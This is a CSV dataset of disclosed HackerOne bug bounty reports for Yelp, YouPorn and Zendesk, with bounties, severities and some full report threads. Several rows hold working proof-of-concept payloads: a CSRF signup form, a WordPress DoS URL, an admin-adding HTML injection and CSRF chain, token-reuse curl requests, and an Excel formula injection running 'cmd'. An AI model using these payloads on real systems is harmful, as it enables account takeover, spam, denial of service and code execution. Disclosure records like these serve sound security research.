Yelp,5001-10000,0.0,200m-1b,$500.00,No value,0.0,Cross-Site Request Forgery (CSRF),CSRF on signup endpoint (auto-api.yelp.com),"denispugachev  submitted a report to Yelp.Oct 29th (6 years ago)Sign up request on https://auto-api.yelp.com/account/create_secure endpoint processes without any checking headers (without cookies, csrf tokens and even user-agent). 
This is sample HTML form:
Code 1.09 KiBWrap lines Copy Download1        <html>
2        <head></head>
3        <body>
4        <form action=""https://auto-api.yelp.com/account/create_secure?time=1477751842&nonce=lej%2F%2FQ%3D%3D&ywsid=Y3yWooClkisSbx32yJG5Ww&device_type=generic%2Bvbox86p%2FKTU84P&app_version=8.16.0&cc=US&lang=en&efs=cDV544hzFZZpMD6wPVsW0GCyHGRNWhykWC%2BKKikA3b3E%2BohV0t%2FxA0eh5tL1sLQnkasS3MI2wLlfhZ01oKUYMwXvUlRB5mRf8Mit5OryQ7o%3D&signature=_qGv3pOMHN%2BUSpUucP3dKxjwALjI%3D"" method=""post"">
5        <input type=""hidden"" name=""first_name"" value=""Test1"" />
6        <input type=""hidden"" name=""last_name"" value=""Test2"" />
7        <input type=""hidden"" name=""email"" value=""testtest@gmailtest.com"" />
8        <input type=""hidden"" name=""password"" value=""123123qq"" />
9        <input type=""hidden"" name=""user_country_code"" value=""AR"" />
10        <input type=""hidden"" name=""city"" value=""12333"" />
11        <input type=""hidden"" name=""confirmed"" value=""0"" />
12        
13        
14        <input type=""submit"" />
15        </form>
16        </body>
17        </html>
18        
19Maybe when you will check it the signature will be expired, but it is not very difficult to generate the new one.
Request / Response
	POST /account/create_secure?time=1477751842&nonce=lej%2F%2FQ%3D%3D&ywsid=Y3yWooClkisSbx32yJG5Ww&device_type=generic%2Bvbox86p%2FKTU84P&app_version=8.16.0&cc=US&lang=en&efs=cDV544hzFZZpMD6wPVsW0GCyHGRNWhykWC%2BKKikA3b3E%2BohV0t%2FxA0eh5tL1sLQnkasS3MI2wLlfhZ01oKUYMwXvUlRB5mRf8Mit5OryQ7o%3D&signature=_qGv3pOMHN%2BUSpUucP3dKxjwALjI%3D HTTP/1.1
Accept-Encoding: gzip
Content-Type: application/x-www-form-urlencoded
Content-Encoding: UTF-8
Host: auto-api.yelp.com
Connection: Keep-Alive
Content-Length: 125
	first_name=Test1&last_name=Test2&email=testtest%40gmailtest.com&password=123123qq&user_country_code=AR&city=12333&confirmed=0
*RESPONSE*
	HTTP/1.1 200 OK
Date: Sat, 29 Oct 2016 14:42:19 GMT
Content-Type: application/json; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Set-Cookie: __cfduid=d35a860a4d504b624ad0351d3bcdb467e1477752138; expires=Sun, 29-Oct-17 14:42:18 GMT; path=/; domain=.yelp.com; HttpOnly
X-Node: api_com
Cache-Control: max-age=0, must-revalidate, no-cache, no-store, private
Expires: Sat, 29 Oct 2016 14:42:19 GMT
Pragma: no-cache
Set-Cookie: bse=9e2087a24cf46f0ac9ffc3a568f27917; Domain=.yelp.com; Path=/; HttpOnly
Set-Cookie: yuv=tGBtYVLk7OMm4UXq3Xg8VWUF0sZz8v-o_XehEQc6yA0z-OfD6Deuih_6l3arCIVz6GWZT0IejmUtGvuj2biDJPBKW1Ubwu0R; Domain=.yelp.com; Max-Age=630720000; Path=/; expires=Fri, 24-Oct-2036 14:42:19 GMT
X-Content-Type-Options: nosniff
Set-Cookie: api_s=s9c-rvqNqBmlTdp6yjSmzr4ajvym_ZiQ; Max-Age=630720000; Path=/; expires=Fri, 24-Oct-2036 14:42:19 GMT; HttpOnly
Set-Cookie: api_ss=h1QM6QqyHD9PHNGIIrXICyWpSBRgnno5; Max-Age=630720000; Path=/; expires=Fri, 24-Oct-2036 14:42:19 GMT; secure; HttpOnly
X-Node: web19-r4-sfo2
Vary: Accept-Encoding,User-Agent
Content-Encoding: gzip
X-Mode: rw
X-Proxied: extlb7-r10-sfo2
X-Mode: rw
X-Proxied: extlb4-r9-iad1
Server: cloudflare-nginx
CF-RAY: 2f9764b29e8e3798-ARN
	{""first_name"": ""Test1"", ""last_name"": ""Test2"", ""user_id"": ""XxFOC5mlKjnhiueLGavvJA"", ""name"": ""Test1 T."", ""is_confirmed"": false, ""expiry"": 1485528139, ""location"": ""La Matanza"", ""name_without_period"": ""Test1 T"", ""message"": {""text"": ""OK"", ""code"": 0, ""version"": ""1.1.1"", ""request_id"": ""428b82b44de28038""}, ""email"": ""testtest@gmailtest.com"", ""last_initial"": ""T""}
How it can be exploitable?
Attacker can make many hidden forms with pre-generated sign up fields to make accounts from victim's IP address (for example very cheap clickunder traffic on special HTML page with hidden form). Later created accounts can be used for spam purposes.
It can be done also with login and password forget endpoint: https://auto-api.yelp.com/account/login_secure
https://auto-api.yelp.com/account/send_password_email_secure
Please check saved Charles session file in attachments2 attachments:F131024: signup_csrf.htmlF131025: session.chlsdenispugachev   posted a comment. Nov 1st (6 years ago)Hi! Is there any update on this report?5a37bf56c8   changed the status to Triaged. Nov 1st (6 years ago)Hi there!
Thanks for submitting your report to us!
We are investigating the reported issue and will update this thread once we have further details.
Best,
The Yelp Security Teamdenispugachev   posted a comment. Nov 14th (6 years ago)Hey! Any updates here?5a37bf56c8   posted a comment. Nov 15th (6 years ago)It's in the queue to be fixed.denispugachev   posted a comment. Dec 13th (6 years ago)Yelp, hi!
This is not fixed yet?5a37bf56c8   posted a comment. Dec 22nd (6 years ago)Hey @denispugachev,
This is a particularly tricky issue to fix, given the long tail of app versions out there. We will continue our investigation in possible ways we can mitigate this vulnerability.
Best,
The Yelp Security Teamdenispugachev   posted a comment. Dec 22nd (6 years ago)@5a37bf56c8 thanks for the answer!
Just want to know if this report is in scope of bounty program?5a37bf56c8   posted a comment. Feb 28th (6 years ago)Hi @denispugachev,
We've shipped a fix. Can you re-verify?
Best,
The Yelp Security Teamdenispugachev   posted a comment. Feb 28th (6 years ago)@5a37bf56c8 hey!
I think it is fixed. I can't create account using browser UA (for example ""Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"").
When I try to make the request I get:
Code 149 BytesWrap lines Copy Download1{
2	""message"": {
3		""text"": ""One or more parameters are missing in request"",
4		""code"": 8,
5		""version"": ""1.1.1"",
6		""request_id"": ""62b57bf81ce3aeb4""
7	}
8}5a37bf56c8   closed the report and changed the status to Resolved. Feb 28th (6 years ago)Hi @denispugachev,
Thanks for verifying the fix!
Best,
The Yelp Security TeamYelp  rewarded denispugachev with a $500 bounty. Feb 28th (6 years ago)denispugachev   requested to disclose this report. Mar 1st (6 years ago)Thanks for bounty!
Full disclosure?5a37bf56c8   agreed to disclose this report. Mar 1st (6 years ago)sure.  This report has been disclosed. Mar 1st (6 years ago)",https://hackerone.com/reports/178831,California,United States,San Francisco,2016,10,29,14,59
Yelp,5001-10000,0.0,200m-1b,$500.00,Medium,4.3,Insecure Direct Object Reference (IDOR),I.D.O.R TO EDIT ALL USER'S CREDIT CARD INFORMATION+(Partial credit card info disclosure),hk755a  submitted a report to Yelp.Jun 5th (4 years ago),https://hackerone.com/reports/361984,California,United States,San Francisco,2018,6,5,6,18
Yelp,5001-10000,0.0,200m-1b,$100.00,Medium,5.45,None,DoS of https://blog.yelp.com/ and other WP instances via CVE-2018-6389,"muhammaddaffa  submitted a report to Yelp.Dec 7th (3 years ago)Description:
There is possibility in /wp-admin/load-scripts.php script to generate large (~3Mb) amount of data via simple non-authenticated request to server.
The vulnerability is registered as https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389
Details:
Detailed attack scenario is described for example here: https://baraktawily.blogspot.ru/2018/02/how-to-dos-29-of-world-wide-websites.html
Affected URL:
https://www.yelpreservations.com/blog/wp-admin/load-scripts.php?load=common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer
How to fix:
RewriteCond %{QUERY_STRING} ^.{1000,}$
RewriteRule ^WP-ADMIN/LOAD-SCRIPTS.PHP$ - f
add this to your .htaccess
Impact
DoS of the site and application server",https://hackerone.com/reports/753491,California,United States,San Francisco,2019,12,7,4,20
Yelp,5001-10000,0.0,200m-1b,$100.00,Medium,5.45,Violation of Secure Design Principles,No rate limiting for confirmation email lead to email flooding,"muhammaddaffa  submitted a report to Yelp.Jan 14th (3 years ago)Description:
There is no rate limiting implemented in sending the confirmation email. Thus, attacker can use this vulnerability to bomb out the email inbox of the victim.
### Affected URL: 
Code 48 BytesWrap lines Copy Download1https://biz.yelp.com/welcome/resend_confirmation
with POST method
### Details:

Login to biz.yelp.com
Go to https://biz.yelp.com/messaging/xxxxxxxxxxxxxxx/inbox, it should look like this Image F683815: biz.png 185.72 KiBZoom in Zoom out Copy Download
Press Re-send email then capture the request, it should like this

Code 688 BytesWrap lines Copy Download1POST /welcome/resend_confirmation HTTP/1.1
2Host: biz.yelp.com
3User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate
7Referer: https://biz.yelp.com/messaging/xxxxxxxxxxxxxxxxxxxxxxxxxxx/inbox
8Content-Type: application/x-www-form-urlencoded
9Content-Length: 129
10Origin: https://biz.yelp.com
11Connection: close
12Cookie: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
13Upgrade-Insecure-Requests: 1
14
15csrftok=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&return_url=%2Fmessaging%2Foj517fznD2Gw2v5CUUIw_Q%2Finbox

Send the captured request to Intruder and repeat the request in loop
Check the email, your email will be flooded by yelp confirmation email Image F683818: impact.png 17.08 KiBZoom in Zoom out Copy Download
### How to fix:
Rate limiting should be implemented

Impact
Email Flooding2 attachments:F683815: biz.pngF683818: impact.png Bot:  posted a comment. Jan 14th (3 years ago)Hi there!
Thanks for submitting your report to us! Please expect a response within a week.
Best,
The Yelp Security Teammuhammaddaffa   posted a comment. Jan 21st (3 years ago)Any update for my report?dchan   changed the status to Triaged. Jan 22nd (3 years ago)Hi @md15ev,
Thanks for reporting the issue. We reproduced the issue and are working on a fix. We will update you when the fix is deployed.
Davidmuhammaddaffa   posted a comment. Jan 28th (3 years ago)Any update about my report?muhammaddaffa   posted a comment. Feb 8th (3 years ago)Hello, any update?Yelp  rewarded muhammaddaffa with a $100 bounty. Feb 10th (3 years ago)Hi @md15ev,
We pushed a change last week to rate-limit the endpoint. The number of e-mails sent by the /welcome/resend_confirmation endpoint is now limited to a small number.
Thanks for the report and your patience.
Davidmuhammaddaffa   posted a comment. Feb 10th (3 years ago)Can you change this report to resolved and we disclose this?dchan   closed the report and changed the status to Resolved. Feb 11th (3 years ago)dchan   requested to disclose this report. Feb 11th (3 years ago)muhammaddaffa   agreed to disclose this report. Feb 11th (3 years ago)  This report has been disclosed. Feb 11th (3 years ago)",https://hackerone.com/reports/774050,California,United States,San Francisco,2020,1,14,1,7
YouPorn,1001-5000,0.0,50m-100m,"$1,000.00",Medium,5.45,Improper Authentication - Generic,Account takeover via Pornhub Oauth,"cyber-guard  submitted a report to YouPorn.Dec 20th (6 years ago)dsimmons   changed the status to Triaged. Dec 22nd (6 years ago)YouPorn  rewarded cyber-guard with a $1,000 bounty. Jan 13th (6 years ago)cyber-guard   posted a comment. Jan 13th (6 years ago)dsimmons   posted a comment. Jan 13th (6 years ago)cyber-guard   posted a comment. Jan 14th (6 years ago)jsacks   closed the report and changed the status to Resolved. Jan 26th (6 years ago)cyber-guard   requested to disclose this report. Feb 13th (6 years ago)jsacks   agreed to disclose this report. Feb 13th (6 years ago)  This report has been disclosed. Feb 13th (6 years ago)Summary by cyber-guardDue to improperly implemented oauth fuctionality and lack of user information validation, it was possible to log in to any Youporn account with a Pornhub account with matching inactivated email address.
Check out the infrastructure monitoring platform BugLabs.me for bounty hunters - https://buglabs.me",https://hackerone.com/reports/192648,Quebec,Canada,Montreal,2016,12,20,7,14
YouPorn,1001-5000,0.0,50m-100m,"$1,000.00",Medium,5.45,Improper Authentication - Generic,Account hijack via deleted PH account,"cyber-guard  submitted a report to YouPorn.Jan 29th (6 years ago)dsimmons   changed the status to Triaged. Jan 30th (6 years ago)YouPorn  rewarded cyber-guard with a $1,000 bounty. Feb 3rd (6 years ago)cyber-guard   posted a comment. Feb 6th (6 years ago)cyber-guard   posted a comment. Feb 7th (6 years ago)jsacks   posted a comment. Feb 7th (6 years ago)jsacks   closed the report and changed the status to Resolved. May 12th (6 years ago)cyber-guard   requested to disclose this report. Jun 12th (5 years ago)jsacks   agreed to disclose this report. Jun 13th (5 years ago)  This report has been disclosed. Jun 13th (5 years ago)Summary by cyber-guardA faulty Oauth auth implementation allowed to hijack Youporn accounts by registering Pornhub accounts, which were previously deleted, or where username was changed.
It should be noted that in order to exploit this flaw, a potential victim would have to perform multiple of quite unlikely steps, thus the overall impact was much lower than other Oauth flaws, yet the YouPorn team very generously paid out a bounty amount for a full authentication flaw.
Check out the infrastructure monitoring platform BugLabs.me for bounty hunters - https://buglabs.me",https://hackerone.com/reports/201940,Quebec,Canada,Montreal,2017,1,29,14,6
YouPorn,1001-5000,0.0,50m-100m,$250.00,High,7.95,Cross-site Scripting (XSS) - DOM,DOM-based XSS on youporn.com (main page),"sp1d3rs  submitted a report to YouPorn.Apr 18th (6 years ago)dsimmons   changed the status to Triaged. Apr 18th (6 years ago)YouPorn  rewarded sp1d3rs with a $250 bounty. Apr 21st (6 years ago)sp1d3rs   posted a comment. May 29th (5 years ago)dsimmons   closed the report and changed the status to Resolved. May 29th (5 years ago)sp1d3rs   requested to disclose this report. May 29th (5 years ago)jsacks   agreed to disclose this report. Jun 13th (5 years ago)  This report has been disclosed. Jun 13th (5 years ago)Summary by sp1d3rsIt was actually Reflected XSS - just inside the <script> section.
Thanks to the YouPorn team for the fast response, quick fix, and the bounty!",https://hackerone.com/reports/221883,Quebec,Canada,Montreal,2017,4,18,13,10
YouPorn,1001-5000,0.0,50m-100m,"$1,000.00",Medium,5.45,Improper Authentication - Generic,IDOR - Access to private video thumbnails even if video requires password authentication,nahamsec  submitted a report to YouPorn.Jan 10th (6 years ago),https://hackerone.com/reports/197114,Quebec,Canada,Montreal,2017,1,10,5,23
YouPorn,1001-5000,0.0,50m-100m,$150.00,Medium,5.45,Improper Authentication - Generic,"Find whether a video has been favourited or not, for any user [via YouPorn Mobile API]","prakharprasad  submitted a report to YouPorn.Feb 2nd (6 years ago)Hi, 
While testing the mobile API, I came across an issue which allows anyone to check whether a specific video has been favourited by a user or not.  The mobile API has the following endpoint which checks whether a video has been favourited or not. However the endpoint is unauthenticated and it is possible to do this for any user based on the numeric user_id.
Endpoint: /app/videos/favorites/check
The following POST request can be used to check whether a video has been favourited by a user or not: 
Code 279 BytesWrap lines Copy Download1POST /api/mobile/duug3daeThooshauth5SheoRei6xarah/app/videos/favorites/check/ HTTP/1.1
2Content-Type: application/x-www-form-urlencoded
3Content-Length: 31
4Host: www.youporn.com
5Connection: close
6Accept-Encoding: gzip
7User-Agent: okhttp/2.2.0
8
9video_id=<video-id>&user_id=<user-id>
Example:
Code 273 BytesWrap lines Copy Download1POST /api/mobile/duug3daeThooshauth5SheoRei6xarah/app/videos/favorites/check/ HTTP/1.1
2Content-Type: application/x-www-form-urlencoded
3Content-Length: 31
4Host: www.youporn.com
5Connection: close
6Accept-Encoding: gzip
7User-Agent: okhttp/2.2.0
8
9video_id=646817&user_id=8182721
If the video is favourited by the user then response is {""success"":true} otherwise if not favourited then the response is {""success"":false}
Thanks!",https://hackerone.com/reports/203042,Quebec,Canada,Montreal,2017,2,2,22,15
YouPorn,1001-5000,0.0,50m-100m,"$1,500.00",High,7.95,Insecure Direct Object Reference (IDOR),IDOR allows any user to edit others videos,zerody  submitted a report to YouPorn.Aug 25th (3 years ago),https://hackerone.com/reports/681473,Quebec,Canada,Montreal,2019,8,25,0,24
YouPorn,1001-5000,0.0,50m-100m,$250.00,Medium,5.45,Cross-site Scripting (XSS) - Generic,Reflected XSS in Meta Tag,"myst404  submitted a report to YouPorn.Feb 6th (6 years ago)Summary by myst404XSS found with @the-useless-one!
All details here: https://the-useless-one.github.io/posts/2017/03/28/meet-beautiful-xss-in-your-area-a-youporn-bug-bounty-sfw/",https://hackerone.com/reports/203974,Quebec,Canada,Montreal,2017,2,6,20,37
YouPorn,1001-5000,0.0,50m-100m,"$2,500.00",Critical,9.5,SQL Injection,Time Based SQL-inject in post-parametr login[username] [domain - youporn.com],almaco  submitted a report to YouPorn.Feb 6th (6 years ago),https://hackerone.com/reports/203935,Quebec,Canada,Montreal,2017,2,6,18,51
YouPorn,1001-5000,0.0,50m-100m,$100.00,Medium,5.45,Cross-site Scripting (XSS) - Generic,XSS via login cookie,myst404  submitted a report to YouPorn.Feb 15th (6 years ago),https://hackerone.com/reports/206737,Quebec,Canada,Montreal,2017,2,15,20,12
Zendesk,5001-10000,0.0,200m-1b,$500.00,Medium,4.8,None, CSRF on developer.zendesk.com via Cache Deception,snapsec  submitted a report to Zendesk.Oct 15th (4 years ago),https://hackerone.com/reports/423986,California,United States,San Francisco,2018,10,15,12,44
Zendesk,5001-10000,0.0,200m-1b,$100.00,No value,0.0,Privilege Escalation,[API ISSUE] agents can Create agents even after they are disabled ! ,"defmax  submitted a report to Zendesk.Aug 25th (7 years ago)Hey guys 
Description :
The Owner of the Zopim dashboard account has an ability to Create agents and disable then, while disabling the an agent , it restricts him to access him to login to the dash board (this is ohk ) but you are not expiring the access_tokens . if access_tokens are reused we could gain access to the account again ! 
Think of a situation where an Owner creates an agent and gives administration access, when the Owner comes to know that its attacker profile , he just disables it !  but disabling the account doesnt seems secure here , the account can be used via access_token
Steps to Reproduce !

Login to Owner account and Create an agent with administrator privilages 
Now Open another browser and login to agent account 
Create an client in agent account and Do the authorization and get down the access_token
Now go to Owner account and disable the agent
Now use this request 

Code 374 BytesWrap lines Copy Download1curl https://www.zopim.com/api/v2/agents \
2  -d '{
3        ""email"": ""attacker@attacker.com"", \
4        ""password"": ""secretpassword"", \
5        ""first_name"": ""attacker"", \
6        ""last_name"": ""Anon"", \
7        ""display_name"": ""Mr Robot"", \
8        ""enabled"": 1, \
9        ""im_server_id"": ""smith"", \
10      }' \
11  -v  \
12  -X POST -H ""Authorization: Bearer `access_token_here`""


You could create an account ! 

Simple Steps To verify

Login to  Agent account and Open this 


https://victim2-80.terminal.com/zopadmin.html



Now Click on "" Done have access_token? Click Here""
IT will prompt ""Allow Or Deny ""  , Click on Allow
Now it will show you the ""Access Token "", Copy it 
Now open Owner account and disable agent account 
Now go here again >> https://victim2-80.terminal.com/zopadmin.html
And give access_token there and Click on Submit 
An account will be created with email = lol@gmail.com  & password=csrfcsrf

Video POC :
https://www.youtube.com/watch?v=wZQTlmE0Lz8&feature=youtu.be 
(Sorry for low clarity :p )
Remediation :
Just expire the access_tokens when the account is disabled like you do when you ""delete"" the account 
Let me know if you need anything 
Regards
N B",https://hackerone.com/reports/84709,California,United States,San Francisco,2015,8,25,19,41
Zendesk,5001-10000,0.0,200m-1b,$500.00,No value,0.0,Cross-Site Request Forgery (CSRF),[CRITICAL] CSRF leading to account take over,"zombiehelp54  submitted a report to Zendesk.Nov 26th (7 years ago)Hi , I have found a CSRF issue in <your_zebdesk>.zendesk.com/jobs/createjob that leads to full account take over.
#Details:
When using bulk user import in https://<your_zendesk>.zendesk.com/import?kind=user after you upload a CSV file and press import , a request is sent to https://<your_zendesk>.zendesk.com/jobs/createjob?[password_email_change_csv_import]=true&job[token]=IozGNzPJIR1AniyrlueEIkLL8&job[update_records]=true&return_to=/people&type=user_import.
if you look at the request you'll see that the only token sent in the request is the job[token] value , so I have tried to change the url to https://<victim_account>.zendesk.com/jobs/createjob?[password_email_change_csv_import]=true&job[token]=IozGNzPJIR1AniyrlueEIkLL8&job[update_records]=true&return_to=/people&type=user_import , but the import failed and I received an email saying that there was an error when importing the users , but the error gave me a hint , This was the email: 
Code 272 BytesWrap lines Copy Download1For some reason the data to import was not ready in our servers. Try again.
2
3We've been notified about this and will solve the problem if there's a bug. If the error persists, please contact our support team. The error was:
4
5undefined method `attachments' for nil:NilClass
as you can see the error gives a hint that the job[token] parameter value is an id of the uploaded CSV file which can only be generated when uploading the csv file in the bulk user import page.
But , wait a second , it says attachments which mean it's actually an id of an attachment , so if the attacker signed up as an end user account and tried to submit a ticket then uploaded his csv file as an attachment and got the file id and replaced it with the job[token] parameter value , so the link will look like :
https://<victim_account>.zendesk.com/jobs/createjob?[password_email_change_csv_import]=true&job[token]=<uploaded_file_id>&job[update_records]=true&return_to=/people&type=user_import, it will work and if the attacker sent that link to an admin user and the admin visited it , a user with admin privileges will be added!
Steps to reproduce:

Login to your zendesk account as an end-user 
Send this POST request through the end user:

Code 1.11 KiBWrap lines Copy Download1 POST https://<account>.zendesk.com/hc/en-us/request_uploads
2Host: sad69.zendesk.com
3User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:33.0) Gecko/20100101 Firefox/33.0
4Accept: application/json, text/javascript, */*; q=0.01
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate
7X-CSRF-Token: KVUlCzxLTdJRkLuZrsGoYMNWgaL56Y3Rg3SwX6DyuMi7UkWo7pEV2I7auJVAmD8k+KKo6d5o0wsouRjzWwsvWQ==
8X-Requested-With: XMLHttpRequest
9Referer: https://sad69.zendesk.com/hc/en-us/requests/new
10Content-Length: 557
11Content-Type: multipart/form-data; boundary=---------------------------3915858413600
12Cookie: <session_cookies>
13Connection: keep-alive
14Pragma: no-cache
15Cache-Control: no-cache
16
17
18-----------------------------3915858413600
19Content-Disposition: form-data; name=""authenticity_token""
20
21<your_token>
22-----------------------------3915858413600
23Content-Disposition: form-data; name=""file""; filename=""csv.csv""
24Content-Type: application/vnd.ms-excel
25
26""name"",""email"",""external_id"",""details"",""notes"",""phone"",""role"",
27""restriction"",""organization"",""tags""
28Hacker,""attacker@example.com"",,,,,""admin"",""This is a hacker"",,
29-----------------------------3915858413600--
3- Now get the response of the request then get the ID of the uploaded file , which will look like this dwYMJH6N8QloZt7lFJeZ9bN26 (Please note that the id is not the attachment token)
4- After that logout from the end user account then login with the account owner account and go to:
Code 174 BytesWrap lines Copy Download1https://<account>.zendesk.com/jobs/create?job[password_email_change_csv_import]=true&job[token]=<uploaded_file_id>&job[update_records]=true&return_to=/people&type=user_import
5- Go to the agent email and you'll see an email saying that user import successfully completed , also you can verify by going to https://<your_account>.zendesk.com/users and you'll see that an admin named Hacker Was added. 
I will attach the CSV file for importing the user , just in case you are having a trouble sending the request in step 2. 
Thanks. 1 attachment:F63561: csv.csv",https://hackerone.com/reports/102194,California,United States,San Francisco,2015,11,26,16,7
Zendesk,5001-10000,0.0,200m-1b,$100.00,No value,0.0,Cross-site Scripting (XSS) - Generic,[CRITICAL] HTML injection issue leading to account take over,"zombiehelp54  submitted a report to Zendesk.Jan 20th (7 years ago)Hi , I have found an HTML injection issue in https://<subdomain>.zendesk.com/people/tags that could lead to account take over.
I can't get malicious scripts executed , but an attacker can take over the admin's account by injecting the following HTML code.
Code 174 BytesWrap lines Copy Download1<h1><a href=""/users?user[name]=Hacker&user[agent_display_name]=Hacker&user[email]=hacker@domain.com&user[restriction_id]=4&user[roles]=2"" data-method=post>CLICK HERE</a></h1>
the data-method attribute is not removed from the <a> tag , so when the admin clicks on Click Here a new user with the name Hacker and the email hacker@domain.com will be added.
Steps to reproduce:

Login with an admin account then go to: 

https://<subdomain>.zendesk.com/people/tags/<h1><a%20href%3D""%2Fusers%3Fuser%5Bname%5D%3DHacker%26user%5Bagent_display_name%5D%3DHacker%26user%5Bemail%5D%3Dhacker%40domain.com%26user%5Brestriction_id%5D%3D4%26user%5Broles%5D%3D2""%20data-method%3Dpost>CLICK%20HERE NOW<%2Fa><%2Fh1><img src=x width=1 height=9999999999>/destroy
You'll see a link saying Click here now click that link and a new admin with the email hacker@domain.com will be added.
Thanks",https://hackerone.com/reports/111915,California,United States,San Francisco,2016,1,20,20,17
Zendesk,5001-10000,0.0,200m-1b,$500.00,No value,0.0,Cross-Site Request Forgery (CSRF),[HIGH RISK] CSRF could potentially delete a zendesk subdomain.,apok  submitted a report to Zendesk.Apr 18th (7 years ago),https://hackerone.com/reports/132049,California,United States,San Francisco,2016,4,18,17,18
Zendesk,5001-10000,0.0,200m-1b,$100.00,No value,0.0,Open Redirect,[status.zopim.com] Open Redirect,bobrov  submitted a report to Zendesk.Dec 12th (7 years ago)noops43   posted a comment. Dec 13th (7 years ago)Zendesk  rewarded bobrov with a $100 bounty. Dec 13th (7 years ago)noops43   changed the status to Triaged. Dec 13th (7 years ago)noops43   closed the report and changed the status to Resolved. Dec 13th (7 years ago)bobrov   requested to disclose this report. Sep 24th (6 years ago)noops43   agreed to disclose this report. Oct 26th (6 years ago)  This report has been disclosed. Oct 26th (6 years ago),https://hackerone.com/reports/104896,California,United States,San Francisco,2015,12,12,21,14
Zendesk,5001-10000,0.0,200m-1b,"$2,000.00",High,7.95,Cross-site Scripting (XSS) - Generic,a stored xss in web widget chat,securitythinker  submitted a report to Zendesk.Dec 22nd (6 years ago),https://hackerone.com/reports/193462,California,United States,San Francisco,2016,12,22,19,18
Zendesk,5001-10000,0.0,200m-1b,$100.00,Medium,6.8,Information Disclosure,Android SDK - CREATE_REQUEST broascast is unprotected,bagipro  submitted a report to Zendesk.Nov 5th (6 years ago),https://hackerone.com/reports/180349,California,United States,San Francisco,2016,11,5,12,31
Zendesk,5001-10000,0.0,200m-1b,$100.00,No value,0.0,Improper Authentication - Generic,AWS S3 bucket writable for authenticated aws user,dpgribkov  submitted a report to Zendesk.Apr 17th (7 years ago),https://hackerone.com/reports/131523,California,United States,San Francisco,2016,4,17,12,59
Zendesk,5001-10000,0.0,200m-1b,$50.00,No value,0.0,Command Injection - Generic,Chat History CSV Export Excel Injection Vulnerability,"pr0tagon1st  submitted a report to Zendesk.Feb 17th (7 years ago)I have found a vulnerability in the Chat History export function. If an attacker submits a special name (containing a system command) when chatting with an agent and that agent later exports the history of that chat to CSV, the resulting CSV may execute commands when opened. I have tested this using MS Excel 2013 on Windows 7.
Proof of Concept:

Open the dashboard as an agent and go to ""Visitor List"".
Select ""Simulate Visitor"". (This vulnerability works in a real scenario as well, simulating a visitor is just the easiest way to reproduce it).
As the simulated visitor, edit your name to ""-2+3+cmd|' /C calc'!G2"" (without the double quotes).
End the chat.
Navigate to the ""History"" section, select the recent chat, click the ""actions"" button, select ""export chat details"", and input a viable email address.
Open the email and unpack the zip file. 
Open the CSV in Excel.
A warning will show up warning the user to disable execution unless he trusts the source of the file. The user may likely leave execution enable due to trusting the source (zopim). Click ""enable"".
A second warning will appear that states a similar message as the previous one (""only open if you trust the source...""). Click ""yes""
The malicious code is executed - in this case it will just open the ""calc"" application. (Screenshot attached).

Threat Level Estimation
On one hand, this vulnerability can be pretty serious as it allows an attacker to execute arbitrary code as the current user. This can easily be used to download and install malware, establishing a firm foothold or to execute a pretty complex phishing attack (opening a browser, changing user settings, etc.) However, the severity of this attack is mitigated by the two warnings that I mentioned in the Proof of Concept. The warnings may be enough to dissuade the user from allowing Excel to execute the malicious code, although the both messages stress trusting the source and users have no reason to distrust zopim.com.
Recommendation
The ""="" is already escaped properly, this escaping should be extended to the ""-"" and ""+"" characters as well.
Let me know if I can help further.
Thanks!1 attachment:F73846: zopim_poc.pngnoops43   posted a comment. Feb 18th (7 years ago)Hello @pr0tagon1st,
Thank you for reporting this issue. The Zendesk Security Team will begin investigating the details of your report immediately. If the issue is verified as a security vulnerability, we will contact you with a timeline for remediation and the amount awarded for the submitted issue.
Regards,
Zendesk SecurityZendesk  rewarded pr0tagon1st with a $50 bounty. Feb 19th (7 years ago)Hello @pr0tagon1st,
Congratulations! Your submitted vulnerability has been validated and is in process for remediation. 
Also, you will be awarded $50 and publicly thanked for the responsible disclosure on our Hall of Fame. 
Regards,
Zendesk Securitynoops43   changed the status to Triaged. Feb 19th (7 years ago)Zendesk  rewarded pr0tagon1st with a $50 bounty. Feb 19th (7 years ago)Hi @pr0tagon1st,
I made an error in the bounty. The award is $100. I'm rewarding you an additional $50 to correct my error. 
I apologies for the inconvenience.
Regards,
Zendesk Securitynoops43   closed the report and changed the status to Resolved. Mar 29th (7 years ago)Hello @pr0tagon1st,
Your submitted issue has been remediated. Thank you for participating in the Zopim Bug Bounty program. Please feel free to reach out if you have any questions or concerns.
Regards,
Zendesk Securitypr0tagon1st   requested to disclose this report. Mar 30th (7 years ago)Awesome! Are you ok with public disclosure?noops43   agreed to disclose this report. Apr 4th (7 years ago)  This report has been disclosed. Apr 4th (7 years ago)",https://hackerone.com/reports/116937,California,United States,San Francisco,2016,2,17,13,8
